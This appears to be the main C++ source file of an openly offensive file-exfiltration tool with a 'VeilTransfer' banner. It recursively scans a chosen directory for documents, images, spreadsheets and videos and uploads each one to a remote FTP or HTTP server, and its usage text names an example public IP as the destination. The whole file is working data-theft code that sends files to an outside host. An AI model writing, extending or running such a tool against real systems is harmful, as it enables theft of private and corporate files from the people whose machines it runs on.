#include <iostream>
#include <string>
#include <vector>
#include <filesystem> // For directory traversal
#include <cstdlib>    // For EXIT_*
#include "FtpUploader.h"   // FTP logic
#include "HttpUploader.h"  // HTTP logic
#include "Utils.h"         // Helper utilities

namespace fs = std::filesystem;

// Function to check if a file has a relevant file extension
bool isRelevantFileType(const std::string& filePath) {
    static const std::vector<std::string> relevantExtensions = {
        ".pdf", ".img", ".png", ".jpg", ".jpeg", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".mp4", ".avi"
    };

    std::string extension = fs::path(filePath).extension().string();
    for (const auto& ext : relevantExtensions) {
        if (extension == ext) {
            return true;
        }
    }
    return false;
}

// Function to exfiltrate all relevant files from the file system
void exfiltrateRelevantFiles(
    const std::string& mode,
    const std::string& username,
    const std::string& password,
    const std::string& server,
    const std::string& remotePath,
    const std::string& startPath
) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(startPath)) {
            if (entry.is_regular_file()) {
                const std::string filePath = entry.path().string();

                if (!isRelevantFileType(filePath)) {
                    std::cout << "[-] Skipping irrelevant file: " << filePath << "\n";
                    continue;
                }

                std::cout << "[*] Found relevant file: " << filePath << "\n";

                if (mode == "ftp") {
                    uploadFTP(username, password, server, filePath, remotePath, {});
                } else if (mode == "http") {
                    uploadHTTP(username, password, server, filePath, remotePath, {});
                } else {
                    std::cerr << "[-] Unknown mode: " << mode << ". Must be 'ftp' or 'http'.\n";
                    return;
                }

                std::cout << "[+] Uploaded: " << filePath << "\n";
            }
        }
    } catch (const std::exception& ex) {
        std::cerr << "[-] Error during file exfiltration: " << ex.what() << "\n";
    }
}

int main(int argc, char* argv[]) {
    //g++ -static-libgcc -static-libstdc++ -O2 -o ftp_uploader.exe main.cpp FtpUploader.cpp HttpUploader.cpp Utils.cpp -lwininet -lshlwapi
    // Print a banner akin to the original code
    std::cout << R"(
 _____     _ _ _____                 ___         
|  |  |___|_| |_   _|___ ___ ___ ___|  _|___ ___ 
|  |  | -_| | | | | |  _| .'|   |_ -|  _| -_|  _|
 \___/|___|_|_| |_| |_| |__,|_|_|___|_| |___|_|  
             v1.0 | FTP/HTTP | by :)
)" << "\n";

    if (argc < 7) {
        std::cout << "[!] Usage:\n"
                  << "    " << argv[0] << " <ftp|http> <username> <password> <server> <localPath> <remotePath>\n\n"
                  << "Examples:\n"
                  << "    " << argv[0] << " ftp user pass 64.94.85.32 C:\\myfiles /upload\n"
                  << "    " << argv[0] << " http user pass 192.168.1.100 C:\\myfiles /upload\n\n";
        return EXIT_FAILURE;
    }

    // Parse arguments
    std::string mode        = argv[1];   // "ftp" or "http"
    std::string username    = argv[2];
    std::string password    = argv[3];
    std::string server      = argv[4];   // e.g., "ftp.example.com" or "192.168.1.100"
    std::string localPath   = argv[5];   // e.g., "C:\\Users\\User\\files"
    std::string remotePath  = argv[6];   // e.g., "/upload"

    // Perform the file exfiltration
    try {
        std::cout << "[*] Starting relevant file exfiltration from: " << localPath << "\n";
        exfiltrateRelevantFiles(mode, username, password, server, remotePath, localPath);
        std::cout << "\n[*] Relevant files exfiltrated successfully.\n";
    } catch (const std::exception& ex) {
        std::cerr << "[-] Error: " << ex.what() << "\n";
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}